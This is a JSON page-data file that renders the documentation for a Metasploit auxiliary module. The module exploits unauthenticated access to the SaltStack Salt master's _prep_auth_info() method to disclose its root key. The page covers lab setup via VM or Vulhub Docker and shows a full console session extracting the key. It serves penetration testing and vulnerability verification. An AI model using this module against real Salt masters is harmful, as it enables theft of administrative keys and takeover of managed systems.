{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/auxiliary/gather/saltstack_salt_root_key","result":{"data":{"moduleMetadataJson":{"id":"26dead6c-dbe7-5e0a-b545-d101df0ee2a3","name":"SaltStack Salt Master Server Root Key Disclosure","fullname":"auxiliary/gather/saltstack_salt_root_key","description":"This module exploits unauthenticated access to the _prep_auth_info()\n          method in the SaltStack Salt master's ZeroMQ request server, for\n          versions 2019.2.3 and earlier and 3000.1 and earlier, to disclose the\n          root key used to authenticate administrative commands to the master.\n\n          VMware vRealize Operations Manager versions 7.5.0 through 8.1.0, as\n          well as Cisco Modeling Labs Corporate Edition (CML) and Cisco Virtual\n          Internet Routing Lab Personal Edition (VIRL-PE), for versions 1.2,\n          1.3, 1.5, and 1.6 in certain configurations, are known to be affected\n          by the Salt vulnerabilities.\n\n          Tested against SaltStack Salt 2019.2.3 and 3000.1 on Ubuntu 18.04, as\n          well as Vulhub's Docker image.","rank":300,"fields":{"detailsSlug":"/modules/details/auxiliary/gather/saltstack_salt_root_key","documentationSlug":"/modules/documentation/auxiliary/gather/saltstack_salt_root_key","referencesSlug":"/modules/references/auxiliary/gather/saltstack_salt_root_key"},"documentation":{"html":"<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<h3 id=\"description\" style=\"position:relative;\"><a href=\"#description\" aria-label=\"description permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Description</h3>\n<p>This module exploits unauthenticated access to the <code class=\"language-text\">_prep_auth_info()</code>\nmethod in the SaltStack Salt master's ZeroMQ request server, for\nversions 2019.2.3 and earlier and 3000.1 and earlier, to disclose the\nroot key used to authenticate administrative commands to the master.</p>\n<p>VMware vRealize Operations Manager versions 7.5.0 through 8.1.0, as\nwell as Cisco Modeling Labs Corporate Edition (CML) and Cisco Virtual\nInternet Routing Lab Personal Edition (VIRL-PE), for versions 1.2,\n1.3, 1.5, and 1.6 in certain configurations, are known to be affected\nby the Salt vulnerabilities.</p>\n<p>Tested against SaltStack Salt 2019.2.3 and 3000.1 on Ubuntu 18.04, as\nwell as Vulhub's Docker image.</p>\n<h3 id=\"setup\" style=\"position:relative;\"><a href=\"#setup\" aria-label=\"setup permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Setup</h3>\n<p><strong>Note:</strong> I did the bulk of my testing after manually installing Salt in\nan <a href=\"#using-a-virtual-machine\">Ubuntu 18.04 VM</a>, but the <a href=\"#using-docker\">Docker image\nfrom Vulhub</a> may be quicker. YMMV.</p>\n<h4 id=\"using-a-virtual-machine\" style=\"position:relative;\"><a href=\"#using-a-virtual-machine\" aria-label=\"using a virtual machine permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Using a virtual machine</h4>\n<ol>\n<li>Set up an Ubuntu 18.04 VM</li>\n<li>Browse to <a href=\"https://repo.saltstack.com/#ubuntu\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">SaltStack's instructions for\nUbuntu</a></li>\n<li>Select <code class=\"language-text\">Pin to Minor Release</code> and change all versions to either\n<strong>2019.2.3</strong> or <strong>3000.1</strong>, depending on the version you wish to test</li>\n<li>Follow the instructions, installing only the <code class=\"language-text\">salt-master</code> and\n<code class=\"language-text\">salt-minion</code> packages necessary for testing</li>\n<li>Follow the <a href=\"https://docs.saltstack.com/en/latest/ref/configuration/index.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">post-installation\nconfiguration</a></li>\n</ol>\n<p>You may now begin testing.</p>\n<h4 id=\"using-docker\" style=\"position:relative;\"><a href=\"#using-docker\" aria-label=\"using docker permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Using Docker</h4>\n<p><strong>Prerequisites:</strong> <a href=\"https://docs.docker.com/get-docker/\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">Docker</a> and\n<a href=\"https://docs.docker.com/compose/install/\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">Docker Compose</a> must be\ninstalled first.</p>\n<p><strong>Note:</strong> The Salt master is already configured and running in the\nfollowing scenario. The majority of the steps below are for configuring\nand starting the minion. Version <strong>2019.2.3</strong> will be used.</p>\n<ol>\n<li>Run <code class=\"language-text\">git clone https://github.com/vulhub/vulhub</code></li>\n<li>Run <code class=\"language-text\">cd vulhub/saltstack/CVE-2020-11651</code></li>\n<li>Run <code class=\"language-text\">docker-compose up -d</code> to start the container in the background</li>\n<li>Run <code class=\"language-text\">docker exec -it cve-2020-11651_saltstack_1 bash</code> to drop to a\nroot shell inside the container</li>\n<li>Run <code class=\"language-text\">echo $&#39;127.0.0.1\\tsalt&#39; &gt;&gt; /etc/hosts</code> to add the master to\n<code class=\"language-text\">/etc/hosts</code> (this allows the minion to find the master)</li>\n<li>Run <code class=\"language-text\">salt-minion -d</code> to execute the minion in the background</li>\n<li>Run <code class=\"language-text\">salt-key -A</code> and accept the key for the minion</li>\n</ol>\n<p>You may now begin testing.</p>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<p>Follow <a href=\"#setup\">Setup</a> and <a href=\"#scenarios\">Scenarios</a>.</p>\n<h2 id=\"actions\" style=\"position:relative;\"><a href=\"#actions\" aria-label=\"actions permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Actions</h2>\n<h3 id=\"dump\" style=\"position:relative;\"><a href=\"#dump\" aria-label=\"dump permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Dump</h3>\n<p>This dumps the Salt master's root key by sending the <code class=\"language-text\">_prep_auth_info()</code>\nmethod and extracting the key from the resulting serialized auth info.</p>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<h3 id=\"saltstack-salt-201923-on-ubuntu-1804\" style=\"position:relative;\"><a href=\"#saltstack-salt-201923-on-ubuntu-1804\" aria-label=\"saltstack salt 201923 on ubuntu 1804 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>SaltStack Salt 2019.2.3 on Ubuntu 18.04</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 &gt; use auxiliary/gather/saltstack_salt_root_key\nmsf5 auxiliary(gather/saltstack_salt_root_key) &gt; options\n\nModule options (auxiliary/gather/saltstack_salt_root_key):\n\n   Name    Current Setting  Required  Description\n   ----    ---------------  --------  -----------\n   RHOSTS                   yes       The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39;\n   RPORT   4506             yes       The target port (TCP)\n\n\nAuxiliary action:\n\n   Name  Description\n   ----  -----------\n   Dump  Dump root key from Salt master\n\n\nmsf5 auxiliary(gather/saltstack_salt_root_key) &gt; set rhosts 172.28.128.5\nrhosts =&gt; 172.28.128.5\nmsf5 auxiliary(gather/saltstack_salt_root_key) &gt; run\n[*] Running module against 172.28.128.5\n\n[*] 172.28.128.5:4506 - Connecting to ZeroMQ service at 172.28.128.5:4506\n[*] 172.28.128.5:4506 - Negotiating signature\n[+] 172.28.128.5:4506 - Received valid signature: &quot;\\xFF\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x7F&quot;\n[*] 172.28.128.5:4506 - Sending identical signature\n[*] 172.28.128.5:4506 - Negotiating version\n[+] 172.28.128.5:4506 - Received compatible version: &quot;\\x03&quot;\n[*] 172.28.128.5:4506 - Sending identical version\n[*] 172.28.128.5:4506 - Negotiating NULL security mechanism\n[+] 172.28.128.5:4506 - Received NULL security mechanism\n[*] 172.28.128.5:4506 - Sending NULL security mechanism\n[*] 172.28.128.5:4506 - Sending READY command of type REQ\n[+] 172.28.128.5:4506 - Received READY reply of type ROUTER\n[*] 172.28.128.5:4506 - Yeeting _prep_auth_info() at 172.28.128.5:4506\n[+] 172.28.128.5:4506 - Received serialized auth info\n[+] 172.28.128.5:4506 - Root key: bv2Ra72DXzkrbFVYNPHrOe9CqM2aKBdl+E46/m/kaxvDsiLxhG+0PS55u704MyOi2/PgD/EadGk=\n[*] 172.28.128.5:4506 - Disconnecting from 172.28.128.5:4506\n[*] Auxiliary module execution completed\nmsf5 auxiliary(gather/saltstack_salt_root_key) &gt; creds\nCredentials\n===========\n\nhost          origin        service                 public  private                                                                       realm  private_type  JtR Format\n----          ------        -------                 ------  -------                                                                       -----  ------------  ----------\n172.28.128.5  172.28.128.5  4506/tcp (salt/zeromq)  root    bv2Ra72DXzkrbFVYNPHrOe9CqM2aKBdl+E46/m/kaxvDsiLxhG+0PS55u704MyOi2/PgD/EadGk=         Password\n\nmsf5 auxiliary(gather/saltstack_salt_root_key) &gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"26dead6c-dbe7-5e0a-b545-d101df0ee2a3"}}}